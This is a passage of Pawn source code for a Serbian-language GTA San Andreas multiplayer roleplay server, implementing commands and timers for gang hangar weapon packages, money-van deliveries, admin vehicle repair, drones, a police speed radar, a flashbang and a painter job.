    new org = PlayerInfo[playerid][xClan];

    if(!IsPlayerInRangeOfPoint(playerid, 50.0, OI[org][oPozExtX], OI[org][oPozExtY], OI[org][oPozExtZ])) return SendErrorMessage(playerid, "Nisi blizu organizacije!");

    Novi_DestroyVehicle(KombiHangar);
    KombiHangar = -1;

    DajPrljavNovac(playerid, 20000);


    SendInfoMessage(playerid, "Uspesno ste dostavili kombi i dobili 20.000$ prljavog novca!");
    return 1;
}

task StvaranjePaketaHangar[1800000]() {

    HangarPaket1 = 1;
    HangarPaket2 = 1;
    HangarPaket3 = 1;
    foreach(Player, i) {

        if(GetFactionType(i) == ORG_TIP_BANDA || GetFactionType(i) == ORG_TIP_MAFIJA) {

            SendInfoMessage(i, "U hangar su stigli paketi!");
        }
    }
    return 1;
}

task StvaranjeKombija[1800000]() { //Pola sata

    if(KombiHangar >= 0) {

        Novi_DestroyVehicle(KombiHangar);
    }

    Novi_DestroyVehicle(KombiHangar);
    KombiHangar = V01D_CreateVehicle(414, 4564.3657,-313.7433,10.7935,297.8251, 0, 0, -1 );
    SetVehicleHealth(KombiHangar, 15000);

    foreach(Player, i) {

        if(GetFactionType(i) == ORG_TIP_MAFIJA || GetFactionType(i) == ORG_TIP_BANDA) {

            SendClientMessage(i, 0xC34848FF, "(Hangar) : {FFFFFF}U hangaru je stigao kombi! Dostavite ga u organizaciju da dobijete novac!");
        }
    }

    return 1;
}

CMD:hangar(playerid) {

    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 4551.8926,-327.4721,11.0860)) return SendErrorMessage(playerid, "Nisi u hangaru!");
    if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA) return SendErrorMessage(playerid, "Moras biti clan bande/mafije!");
    if(PlayerInfo[playerid][xHangarTime] > 0) return SendErrorMessage(playerid, "Ovu komandu mozes na svakih 10 minuta!");
    ShowPlayerDialog(playerid, dialog_HangarUzmi, DIALOG_STYLE_LIST, D_NASLOV, "Paket 1(Sniper, Deagle, 30 armor)\nPaket 2(Deagle, M4, Health Reset)\nPaket 3(AK47, Colt, Country Rifle)", "Potvrdi", "Odustani");
    return 1;
}

ptask HangarIstekTimer[60000](playerid) {

    if(PlayerInfo[playerid][xHangarTime] == 0) return 0;

    PlayerInfo[playerid][xHangarTime]--;

    return 1;
}

alias:afuel("agorivo");
CMD:afuel(playerid) {

    if(PlayerInfo[playerid][xAdmin] < 1) return SendErrorMessage(playerid, "Samo admini!");
    if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Moras biti u vozilu!");
    new vehicle = GetPlayerVehicleID(playerid);
    // if(TipVozila[vehicle] != PRIVATNO_VOZILO) return SendErrorMessage(playerid, "Vozilo mora biti privatno!");
    Fuel[vehicle] = getAmountFuel(vehicle);
    FuelTime[vehicle] = 0;

    SendInfoMessage(playerid, "Napunio si vozilo gorivom!");

    return 1;
}

CMD:vipfuel(playerid) {

    if(VipFuelTime[playerid] != 0) return SendErrorMessage(playerid, "Sacekaj malo!");
    if(PlayerInfo[playerid][xVIPLevel] != 6) return SendErrorMessage( playerid, "Niste ovlasceni!" );
    if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Moras biti u vozilu!");
    new vehicle = GetPlayerVehicleID(playerid);
    if(!PrivatnoVozilo(vehicle)) return SendErrorMessage(playerid, "Vozilo mora biti privatno!");
    Fuel[vehicle] = getAmountFuel(vehicle);
    FuelTime[vehicle] = 0;

    SendInfoMessage(playerid, "Napunio si vozilo gorivom!");

    VipFuelTime[playerid] = 300;

    return 1;
}

alias:vozilohp("fvp", "fpv");
CMD:vozilohp(playerid, params[]) {

    if( PlayerInfo[ playerid ][ xAdmin] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 || PlayerInfo[playerid][xSpecAdmin] == 1) {

        new id;
        if(sscanf(params, "u", id)) return SendUsageMessage(playerid, "/vozilohp [ID]");

        if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Igrac nije online!");
        if(!IsPlayerInAnyVehicle(id)) return SendErrorMessage(playerid, "Igrac nije u vozilu!");
        if(GetPlayerState(id) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Igrac nije na mestu vozaca!");

        Novi_RepairVehicle(id, GetPlayerVehicleID(id));
        Novi_SetVehicleHealth(GetPlayerVehicleID(id), 1000.0 );

        SendInfoMessage(playerid, "Popravio si vozilo igracu %s", ImeIgraca(id));
        SendInfoMessage(id, "Administrator %s vam je popravio vozilo!", ImeIgraca(playerid));
        format(globalstring, sizeof( globalstring ), "FIX | %s je popravio vozilo igracu %s", ImeIgraca( playerid ), ImeIgraca(id) );
        AdminPoruka( NARACRVENA, globalstring );
    } else return SendErrorMessage(playerid, "Niste ovlasceni!");

    return 1;
}

// CMD:vratistats(playerid, params[]) {

//     if(PlayerInfo[playerid][xAdmin] < 4) 
//     	return SendErrorMessage(playerid, "Nisi ovlascen!");

//     new id;
//     if(sscanf(params, "u", id)) 
//     	return SendUsageMessage(playerid, "/vratistats [ID]");


//     if(!IsPlayerConnected(id)) 
//     	return SendErrorMessage(playerid, "Igrac nije online!");

//     if(PlayerInfo[id][xLevel] > 1) 
//     	return SendErrorMessage(playerid, "Ne mozes vratiti stats igracu sa levelom 2+!");

//     PlayerInfo[id][xLevel] = 3;
//     SetPlayerScore(id, PlayerInfo[id][xLevel]);
//     dajSkillPoen(playerid, 3);
//     DajIgracuNovac(id, 50000);
//     SendInfoMessage(playerid, "Vratio si stats igracu %s", ImeIgraca(id));
//     SendInfoMessage(id, "Admin %s vam je vratio stats!", ImeIgraca(playerid));
//     return 1;
// }

timer VojnikVoziHelikopter[120000](playerid) {

    Novi_DestroyVehicle(VojnikMisijaJedanVozilo[playerid]);
    VojnikMessage(playerid, "Nisi vratio vozilo na vreme u bazu!");
    Novi_DisablePlayerCheckpoint(playerid);
    ResetPlayerWeapons(playerid);
    RadiVojnik{playerid} = false;
    UzeoOpremu[playerid] = false;
    PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
    return 1;
}

CMD:poslovi(playerid) {

	if(!IsPlayerInRangeOfPoint(playerid, 2.0, -809.7888,1000.0971,-56.6087)) return SendErrorMessage(playerid, "Nisi u birou za zaposljavanje!");

    new string[128], BigString[2000];
    for(new job = 1; job < MAX_JOBS; job++) {

        format(string, sizeof(string), "%s\n", jobsInfos[job][jName]);
        strcat(BigString, string);
    }
    ShowPlayerDialog(playerid, dialog_Poslovi, DIALOG_STYLE_LIST, "Odaberite Posao", BigString, "Odaberi", "Odustani");

	return 1;
}

CMD:update(playerid) {

    // return SendInfoMessage(playerid, "Radi se update!");

    new DialogStrgEx1[ 3000 ];

    strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white"Update V1.5.1 Mini BugFix"SRVBOJA1SCM"__________________________\n\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Sada na svakoj zoni pise vrsta zone ( obicna, specijalna, mats )\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Napravljen timer od 20 minuta za zauzimanje zone od strane jednog coveka\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Ubacen voice chat ( pricate tipkom 'X' )\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Izbacen One Shot Sniperom u glavu\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" AK-47 skida vise HP-a igracu koga pucate\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Za /time vise nije potreban sat\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Izmenjena malo poruka za oglase\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Kada igrac koji zauzima napusti teritoriju prebacuje se zauzimanje na clana koji jeste\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Sada Rank5 moze pokrenuti war\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Izmenjen /makegun\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Dobijanje od materijal zone smanjeno na 30-50 matsa \n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Dobitak naftne platforme povecan sa 20.000$ na 40.000$\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Izbacena privatna vozila dok se ne napravi novi sistem\n\n");

    // strcat( DialogStrgEx1, ""SRVBOJA1SCM"UPDATE | "col_white" Nova mapa Banka Interijera\n");

    SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"Update", DialogStrgEx1, "Potvrdi", "");
}

CMD:dron(playerid, params[]) {

    if(DronVozi[playerid] != -1) return SendErrorMessage(playerid, "Vec vozis neki dron!");
    if(PlayerInfo[playerid][xBaterija] == 0) return SendErrorMessage(playerid, "Nemas baterije! Idi na trafiku!");

    ShowPlayerDialog(playerid, dialog_OdaberiDron, DIALOG_STYLE_LIST, "Odabir drona", "Autic\nHelikopter", D_ODABERI, D_ODUSTANI);

    return 1;
}

CMD:stopdron(playerid) {

    if(DronVozi[playerid] == -1) return SendErrorMessage(playerid, "Ne vozis nijedan dron!");

    if(IsValidVehicle(DronVozi[playerid]))
        Novi_DestroyVehicle( DronVozi[ playerid ] );
    DronVozi[ playerid ] = -1;

    SendInfoMessage(playerid, "Zaustavio si voznju drona!");

    return 1;
}

timer DronVoziloTimer[1000](playerid) {

    if(DronVozi[playerid] == -1) return 0;

    DronTime[playerid]--;
    if(DronTime[playerid] == 0) {

        ShowPlayerDialog(playerid, dialog_DronIsteklo, DIALOG_STYLE_MSGBOX, D_NASLOV, "Baterija se ispraznila! Zelite li da iskoristite drugu?", "Potvrdi", "Odustani");

        // SendInfoMessage( playerid, "Vreme isteklo!");
        // Novi_DestroyVehicle( DronVozi[ playerid ] );
        // DronVozi[ playerid ] = -1;

        return 1;
    }

    defer DronVoziloTimer(playerid);
    return 1;
}

CMD:kupidron(playerid) {

    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 934.6881,-1525.1334,13.5960)) return SendErrorMessage(playerid, "Nisi na mestu u Gigatronu!");
    ShowPlayerDialog(playerid, dialog_KupiDron, DIALOG_STYLE_LIST, "Odaberi Vrstu Drona", "Autic(20.000$)\nHelikoper(25.000$)", D_ODABERI, D_ODUSTANI);

    return 1;
}

CMD:jobskill(playerid) {

    if(PlayerInfo[playerid][xPosao] == 0) return SendErrorMessage(playerid, "Nisi zaposlen!");

    new DialogStrgEx1[ 3000 ];

    strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" Job Skill "SRVBOJA1SCM"__________________________\n\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"Sto vise ruta posla odradite, vise novca dobijate!\n\n");

    new string[128];
    format(string, sizeof(string), "Trenutni nivo na poslu %s : "col_white"%d/5\n", getJobName(PlayerInfo[playerid][xPosao]), PlayerInfo[playerid][xJobSkill]);
    strcat( DialogStrgEx1, string);
    format(string, sizeof(string), ""SRVBOJA1SCM"Broj odradjenih ruta : "col_white"%d/%d\n", PlayerInfo[playerid][xDeliveryBroj] , potrebnoTura(playerid));
    strcat(DialogStrgEx1, string);

    SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"Job Skill", DialogStrgEx1, "Potvrdi", "");

    return 1;
}

task ActorPozicijeReset[4000]() {

    SetActorPos(RolexCuvar, 1807.0728,-1238.0975,13.6499);

    SetActorPos(UlicneTrkeActor, 1792.8724,-1927.1606,13.3891);
    SetActorFacingAngle(UlicneTrkeActor, 348.2829);

    SetActorPos(BankaCuvar, 1008.5363,1882.8649,1202.2400);

    SetActorPos(ZlataraCuvar, 1096.7706,-1673.0735,13.5749);

    SetActorPos(EnemyActor1, 222.6090,1899.6664,17.6481);
    SetActorPos(EnemyActor2, 246.3216,1843.0695,8.7578);

    SetActorPos(misijaPDActor, 2446.3269,-2023.6095,13.5469);

    SetActorPos(misijaEnemy1, 1483.0890,-1724.5442,6.7405);
    SetActorPos(misijaEnemy2, 1491.9631,-1705.0231,8.2542);
    SetActorPos(misijaEnemy3, 1489.7394,-1695.7144,8.2542);

    SetActorPos(vojnik2Enemy1, -340.2792,2220.6592,42.4815);
    SetActorPos(vojnik2Enemy2, -373.5531,2234.0632,42.4844);
    SetActorPos(vojnik2Enemy3, -417.1202,2226.5022,47.0411);
    SetActorPos(vojnik2Boss, -408.5094,2211.8567,42.4297);
    SetActorPos(vojnik2Pomocni, -408.9155,2214.8167,42.4297);

    SetActorPos(vojnik2EnemyT1, -704.5834,2293.1313,130.3154);
    SetActorPos(vojnik2EnemyT2, -669.4922,2325.2224,136.1692);

    return 1;
}

timer ItemUseCountDown[1000](playerid) {

    if(ItemUseTimer[playerid] != 0) {

        ItemUseTimer[playerid]--;
        defer ItemUseCountDown(playerid);
        return 1;
    }
    else {

        ItemUseTimer[playerid] = 0;
        return 1;
    }
}

timer ItemUseCountDownMedKit[1000](playerid) {

    if(ItemUseMedKit[playerid] != 0) {

        ItemUseMedKit[playerid]--;
        defer ItemUseCountDownMedKit(playerid);
        return 1;
    }
    else {

        ItemUseMedKit[playerid] = 0;
        return 1;
    }
}

alias:leaderboard("warstats");
CMD:leaderboard( playerid) {
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    for( new i = 1; i < MAX_ORG; i++ ) {
    
        new oFile[ 40 ];
        format(oFile, sizeof( oFile ), O_FILE, i );
        if( fexist( oFile ) ) {

            format( globalstring, sizeof( globalstring ), ""col_white"Ime organizacije %d: "col_crvena"%s "col_white" | Pobedjeni War : %d\n", OI[ i ][ oID ], OI[ i ][ oName ], OI[i][oPobedjeniWar] );
            strcat( DialogStrgEx, globalstring );
        }
    }
    ShowPlayerDialog( playerid, 0, DSMSG, ""col_crvena"War LeaderBoard", DialogStrgEx, "U redu", "" );
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    return 1;
}

task StvaranjePaketa[3600000]() {

    foreach(Player, i) {

        if(NosiPaket[i]) 
            NosiPaket[i] = false;
    }

    StvorenPaket = true;

    if(IsValidDynamicPickup(PaketPickup))
        DestroyDynamicPickup(PaketPickup);

    SendClientMessageToAll(-1,"{FF7300}NOVAC PAKET: (( {FFFFFF}Paket sa novcem je stigao na tajnu lokaciju. {FF7300}))");

    PaketPickup = CreateDynamicPickup(1550, 1, -66.4619,-1106.0239,1.0781, -1, -1, -1, 40.0);

    return 1;
}

timer KreirajPickup[3000]() {

    PaketPickup = CreateDynamicPickup(1550, 1, -66.4619,-1106.0239,1.0781, -1, -1, -1, 40.0);

    return 1;
}

CMD:kreirajkombi(playerid)
{
    if(KombiKreiran) return SendErrorMessage(playerid, "Kombi je vec kreiran!");
    if(PlayerInfo[playerid][xAdmin] < 4) return SendErrorMessage(playerid, "Nisi osvlascen!");
    
    Novi_DestroyVehicle(KombiPrevoz);
    KombiPrevoz = V01D_CreateVehicle(428, 1190.3206,-1372.2904,13.5718,180.2484, 0, 0, -1 );

    KombiKreiran = true;
    
    SendClientMessageToAll(-1,"{FF7300}KOMBI: (( {FFFFFF}Kombi sa novcem je stigao u policijsku stanicu. {FF7300}))");
    SendClientMessageToAll(-1,"{FF7300}KOMBI: (( {FFFFFF}Policijske snage imaju zadatak da odnesu kombi do baze u  LV! {FF7300}))");
    SendClientMessageToAll(-1,"{FF7300}KOMBI: (( {FFFFFF}Pokusajte oteti taj kombi! {FF7300}))");

    return true;
}

CMD:kombilokacija(playerid) {

    if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA && GetFactionType(playerid) != ORG_TIP_PD)
        return SendErrorMessage(playerid, "Samo clanovi bande/mafije ili policija!");

    if(GetFactionType(playerid) == ORG_TIP_PD) {

        Novi_SetPlayerCheckpoint(playerid, 2298.3318,2428.1663,10.8203, 4.0);

        SendInfoMessage(playerid, "Lokacija dostave oznacena na mapi! Kada stignes kucaj /predajnovac");
        SendInfoMessage(playerid, "Da izgasis marker kucaj /ugasikombigps");

        return 1;
    }
    else {

        new org = PlayerInfo[playerid][xClan];

        Novi_SetPlayerCheckpoint(playerid, OI[org][oPozExtX], OI[org][oPozExtY], OI[org][oPozExtZ], 4.0);

        SendInfoMessage(playerid, "Lokacija dostave oznacena na mapi! Kada stignes kucaj /predajnovac");
        SendInfoMessage(playerid, "Da izgasis marker kucaj /ugasikombigps");

        return 1;
    }
}

CMD:ugasikombigps(playerid) {

    Novi_DisablePlayerCheckpoint(playerid);

    return 1;
}

CMD:kombigps(playerid) {

    if(!KombiKreiran) return SendErrorMessage(playerid, "Kombi nije kreiran!");

    if(IsValidVehicle(KombiPrevoz)) {

        new Float:Pozz[3];
        GetVehiclePos(KombiPrevoz, Pozz[0], Pozz[1], Pozz[2]);

        Novi_DisablePlayerCheckpoint(playerid);
        Novi_SetPlayerCheckpoint(playerid, Pozz[0], Pozz[1], Pozz[2], 3.0);

        SendInfoMessage(playerid, "Kombi je oznacen na mapi!");

    }
    return 1;
}

CMD:predajnovac(playerid) {

    if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Moras biti u vozilu!");
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");
    if(GetPlayerVehicleID(playerid) != KombiPrevoz) return SendErrorMessage(playerid, "Moras biti u kombiju!");

    if(GetFactionType(playerid) == ORG_TIP_PD) {

        if(!IsPlayerInRangeOfPoint(playerid, 20.0, 2298.3318,2428.1663,10.8203)) return SendErrorMessage(playerid, "Nisi ispred policije u LV!");

        Novi_DestroyVehicle(KombiPrevoz);
        KombiPrevoz = -1;

        KombiKreiran = false;

        foreach(Player, i) {

            if(IsPlayerConnected(i) && GetFactionType(i) == ORG_TIP_PD && PoliceDuty[i]) {

                DajIgracuNovac(i, 10000);
                SendInfoMessage(i, "Dobio si nagradu od 10.000$ za uspesno dostavljen novac!");
            }
        }

        return 1;
    }
    else {

        if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA) return SendErrorMessage(playerid, "Ne mozes to!");

        new org = PlayerInfo[playerid][xClan];

        if(!IsPlayerInRangeOfPoint(playerid, 50.0, OI[org][oPozExtX], OI[org][oPozExtY], OI[org][oPozExtZ])) return SendErrorMessage(playerid, "Nisi blizu organizacije!");

        Novi_DestroyVehicle(KombiPrevoz);
        KombiPrevoz = -1;

        KombiKreiran = false;

        // new OrgID = PlayerInfo[playerid][xClan];

        // OI[ OrgID ][ oSafeMoney ] += 200000;
        // SaveOrganization( OrgID );

        new novac = RandomNew(20000, 40000);

        DajPrljavNovac(playerid, novac);


        SendInfoMessage(playerid, "Uspesno si dovezao kombi i dobio %d$ prljavog novca!", novac);

        return 1;
    }
}

task RandomServerPoruke[10000]() {

    foreach(Player, i) {

        if(PlayerLogged[i]) {

            if( TogHud[ i ] ) return 0;

            TextDrawHideForPlayer(i, InGame_TD[4]);
            TextDrawSetString(InGame_TD[4], RandomSPoruke[random(sizeof(RandomSPoruke))]);
            TextDrawShowForPlayer(i, InGame_TD[4]);

            new rekonline[16];

            TextDrawHideForPlayer(i, InGame_TD[16]);
            format(rekonline, 16, "REKORD:_%d", ServerInfo[RekordServera]);
            TextDrawSetString(InGame_TD[16], rekonline);
            TextDrawShowForPlayer(i, InGame_TD[16]);

            TextDrawHideForPlayer(i, InGame_TD[15]);
            format(rekonline, 16, "ONLINE:_%d", OnlineIgraca);
            TextDrawSetString(InGame_TD[15], rekonline);
            TextDrawShowForPlayer(i, InGame_TD[15]);
        }
    }

    return 1;
}

ptask PromenaSvega[1000](playerid) {

    if(PlayerLogged[playerid]) {

        if( TogHud[ playerid ] ) return 0;

        new string[64];

        PlayerTextDrawHide(playerid, LokacijaIgracaTD[playerid]);
        format(string, sizeof(string), "%s", GetPlayerLocation(playerid));
        PlayerTextDrawSetString(playerid, LokacijaIgracaTD[playerid], string);
        PlayerTextDrawShow(playerid, LokacijaIgracaTD[playerid]);

        // PlayerTextDrawHide(playerid, LevelIgracaTD[playerid]);
        // format(string, sizeof(string), "%d", PlayerInfo[playerid][xLevel]);
        // PlayerTextDrawSetString(playerid, LevelIgracaTD[playerid], string);
        // PlayerTextDrawShow(playerid, LevelIgracaTD[playerid]);

        // PlayerTextDrawHide(playerid, ImeIgracaTD[playerid]);
        // format(string, sizeof(string), "%s", ImeIgraca(playerid));
        // PlayerTextDrawSetString(playerid, ImeIgracaTD[playerid], string);
        // PlayerTextDrawShow(playerid, ImeIgracaTD[playerid]);
    }

    return 1;
}

PostaviSkin(playerid, skin) {

    SetPlayerSkin(playerid, skin);

    if( TogHud[ playerid ] ) return 0;

    PlayerTextDrawHide(playerid, SkinIgraca[playerid]);
    PlayerTextDrawSetPreviewModel(playerid, SkinIgraca[playerid], skin);
    PlayerTextDrawShow(playerid, SkinIgraca[playerid]);

    return 1;
}

timer PostavioRadarTimer[100](playerid) {

    if(!PostavioRadar[playerid]) return 1;
    if(PostavioRadar[playerid]) {

        new Float:Pozicijaa[3];
        GetDynamicObjectPos(RadarObjekat[playerid], Pozicijaa[0], Pozicijaa[1], Pozicijaa[2]);
        if(!IsPlayerInRangeOfPoint(playerid, 20.0, Pozicijaa[0], Pozicijaa[1], Pozicijaa[2])) {

            DestroyDynamicObject(RadarObjekat[playerid]);
            PostavioRadar[playerid] = false;
            SendInfoMessage(playerid, "Previse si se odmaknuo od radara i on se unistio!");
            return 1;
        }
        foreach(Player, i) {

            if(IsPlayerInAnyVehicle(i) && !UslikanSkoro[i] && GetSpeed(i) > 100 && IsPlayerInRangeOfPoint(i, 15.0, Pozicijaa[0], Pozicijaa[1], Pozicijaa[2])) {

                if(!PoliceDuty[i] && !AdminDuty[i]) {

                    UslikanSkoro[i] = true;
                    SendClientMessage(i, -1, "{F5052D}[RADAR] {FFFFFF}Radar vas je uslikao! Dobili ste 1 wanted level zbog prekoracenja brzine!");
                    GameTextForPlayer( i, "~r~RADAR VAS JE USLIKAO", 2000, 5 );
                    PostaviWanted(i, "Prekoracenje Brzine", "Radar", 1);
                    if(PlayerInfo[i][xWanted] > 0) {

                        new string[128];
                        format( string, sizeof( string ), "* Radar je identifikovao osumnjicenog %s. Koristi /dosije i /lociraj!", ImeIgraca( i ) );
                        if( IsPlayerConnected( i ) ) {
                            if( GetFactionType(i) == ORG_TIP_PD ) {
                                SCM( i, 0x8D8DFF00, string );
                            }
                        }
                    }
                    defer UslikanSkoroTimer(i);
                }
            }
        }
        defer PostavioRadarTimer(playerid); 
    }
    return 1;
}

timer UslikanSkoroTimer[10000](i) {

    UslikanSkoro[i] = false;
    return 1;
}

CMD:radar(playerid) {

    if(GetFactionType(playerid) != ORG_TIP_PD) return SendErrorMessage(playerid, "Niste u mogucnosti koristiti ovu komandu");
    if(!PoliceDuty[playerid]) return SendErrorMessage(playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if(PostavioRadar[playerid]) return SendErrorMessage(playerid, "Vec si postavio radar! /unistiradar");

    new Float:PosIgrac[3];
    GetPlayerPos(playerid, PosIgrac[0], PosIgrac[1], PosIgrac[2]);
    //RadarObjekat[playerid] = CreateObject(18880, PosIgrac[0], PosIgrac[1]+1, PosIgrac[2]-2, 0, 0, 0, 100.0);
    RadarObjekat[playerid] = CreateDynamicObject(18880, PosIgrac[0], PosIgrac[1]+1, PosIgrac[2]-2, 0, 0, 0, -1, -1, -1, 100.0, 100.0, -1, 0);
    PostavioRadar[playerid] = true;

    defer PostaviRadar(playerid);

    SendInfoMessage(playerid, "Uspesno si postavio radar! Da ga unistis koristi /unistiradar ili se odmakni od njega!");

    return 1;
}

timer PostaviRadar[2000](playerid) {

    defer PostavioRadarTimer(playerid);

    return 1;
}

CMD:unistiradar(playerid) {

    if(GetFactionType(playerid) != ORG_TIP_PD) return SendErrorMessage(playerid, "Niste u mogucnosti koristiti ovu komandu");
    if(!PoliceDuty[playerid]) return SendErrorMessage(playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if(!PostavioRadar[playerid]) return SendErrorMessage(playerid, "Nisi postavio radar! /postaviradar");

    DestroyDynamicObject(RadarObjekat[playerid]);
    PostavioRadar[playerid] = false;

    SendInfoMessage(playerid, "Unistio si radar!");

    return 1;
}

CMD:flash(playerid) {

    if(GetFactionType(playerid) != ORG_TIP_PD) return SendErrorMessage(playerid, "Niste u mogucnosti koristiti ovu komandu");
    if(!PoliceDuty[playerid]) return SendErrorMessage(playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if(PlayerInfo[playerid][xRank] < 2) return SendErrorMessage(playerid, "Samo rank 2+!");
    if(FlashTime[playerid]) return SendErrorMessage(playerid, "Moras malo sacekati pre ponovnog koriscenja!");

    new Float:PosP[3];
    GetPlayerPos(playerid, PosP[0], PosP[1], PosP[2]);

    ApplyAnimation(playerid, "GRENADE", "WEAPON_throw", 4.0, 0, 0, 0, 0, 0, 0);

    foreach(Player, i) {

        if(i == playerid) continue;

        if(!ActiveFlash[i]) {

            if(IsPlayerInRangeOfPoint(i, 10.0, PosP[0], PosP[1], PosP[2])) {

                FlashPlayer(i, 6);
            }
            else if(IsPlayerInRangeOfPoint(i, 20.0, PosP[0], PosP[1], PosP[2])) {

                FlashPlayer(i, 2);
            }
        }
    }

    FlashTime[playerid] = true;
    defer FlashCount(playerid);

    new string[128];
    format( string, sizeof( string ), "* %s baca flash..", ImeIgraca( playerid ));

    PorukaRadius( 20.0, playerid, string, 0x1874CDFF );

    return 1;
}

FlashPlayer(id, vreme) {

    ActiveFlash[id] = true;
    if(vreme == 6) {

        defer FlashTimer1(id);
    }
    else if(vreme == 2) {

        defer FlashTimer2(id);
    }

    PlayerTextDrawShow(id, BeliTD[id]);

    return 1;
}

timer FlashTimer1[6000](id) {

    ActiveFlash[id] = false;
    PlayerTextDrawHide(id, BeliTD[id]);

    return 1;
}

timer FlashTimer2[2000](id) {

    ActiveFlash[id] = false;
    PlayerTextDrawHide(id, BeliTD[id]);

    return 1;
}

timer FlashCount[30000](playerid) {

    FlashTime[playerid] = false;

    return 1;
}

timer UcitavanjeTimer[3000](playerid) {

    TogglePlayerControllable( playerid, true);
    return 1;
}

timer FarbanjeTimerrr[7000](playerid) {

    switch(MolerCP[playerid]) {

        case 1: {

            MolerCP[playerid]++;
            SetPlayerObjectMaterial(playerid, MolerZid[0][playerid], 0, 3776, "donut_tray", "cupside_rb", 0x00000000);

            TogglePlayerControllable(playerid, 1);
            ClearAnimations(playerid);

            Novi_SetPlayerCheckpoint(playerid, 1744.2925,1761.3444,1128.1322, 3.0);

            return 1;
        }
        case 2: {

            MolerCP[playerid]++;
            SetPlayerObjectMaterial(playerid, MolerZid[1][playerid], 0, 3776, "donut_tray", "cupside_rb", 0x00000000);

            TogglePlayerControllable(playerid, 1);
            ClearAnimations(playerid);

            Novi_SetPlayerCheckpoint(playerid, 1742.4797,1757.4856,1128.1322, 3.0);

            return 1;
        }
        case 3: {

            MolerCP[playerid]++;
            SetPlayerObjectMaterial(playerid, MolerZid[2][playerid], 0, 3776, "donut_tray", "cupside_rb", 0x00000000);

            TogglePlayerControllable(playerid, 1);
            ClearAnimations(playerid);

            Novi_SetPlayerCheckpoint(playerid, 1734.1561,1757.7722,1128.1322, 3.0);

            return 1;
        }
        case 4: {

            MolerCP[playerid]++;
            SetPlayerObjectMaterial(playerid, MolerZid[3][playerid], 0, 3776, "donut_tray", "cupside_rb", 0x00000000);

            TogglePlayerControllable(playerid, 1);
            ClearAnimations(playerid);

            Novi_SetPlayerCheckpoint(playerid, 1729.9531,1759.1914,1128.1322, 3.0);

            return 1;
        }
        case 5: {

            MolerCP[playerid]++;
            SetPlayerObjectMaterial(playerid, MolerZid[4][playerid], 0, 3776, "donut_tray", "cupside_rb", 0x00000000);

            TogglePlayerControllable(playerid, 1);
            ClearAnimations(playerid);

            Novi_SetPlayerCheckpoint(playerid, 1729.6639,1768.0946,1128.1322, 3.0);

            return 1;
        }
        case 6: {

            MolerCP[playerid]++;
            SetPlayerObjectMaterial(playerid, MolerZid[5][playerid], 0, 3776, "donut_tray", "cupside_rb", 0x00000000);

            TogglePlayerControllable(playerid, 1);
            ClearAnimations(playerid);

            Novi_SetPlayerCheckpoint(playerid, 1732.0717,1772.7159,1128.1322, 3.0);

            return 1;
        }
        case 7: {

            MolerCP[playerid]++;
            SetPlayerObjectMaterial(playerid, MolerZid[6][playerid], 0, 3776, "donut_tray", "cupside_rb", 0x00000000);

            TogglePlayerControllable(playerid, 1);
            ClearAnimations(playerid);

            Novi_SetPlayerCheckpoint(playerid, 1741.0754,1772.7399,1128.1322, 3.0);

            return 1;
        }
        case 8: {

            Novi_SetPlayerPos(playerid, -1685.6660,1035.8398,45.2109);
            SetPlayerVirtualWorld(playerid, 0);
            TogglePlayerControllable(playerid, false);
            ClearAnimations(playerid);
            defer UcitavanjeTimer(playerid);

            for(new obj = 0; obj < 8; obj++) {

                DestroyPlayerObject(playerid, MolerZid[obj][playerid]);
            }

            RadiMoler[playerid] = false;

            if(ServerInfo[HappyJob] == POSAO_MOLER) {
                dajPlatuIgracu(playerid, PlataPosla[PLATA_MOLER] * 2);
                SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
            }
            else dajPlatuIgracu(playerid, PlataPosla[PLATA_MOLER]);

            BussinesJobMoney(POSAO_MOLER, PlataPosla[PLATA_MOLER]/2);

            SendInfoMessage(playerid, "Uspesno si zavrsio posao i zaradio %d$!", PlataPosla[PLATA_MOLER]);
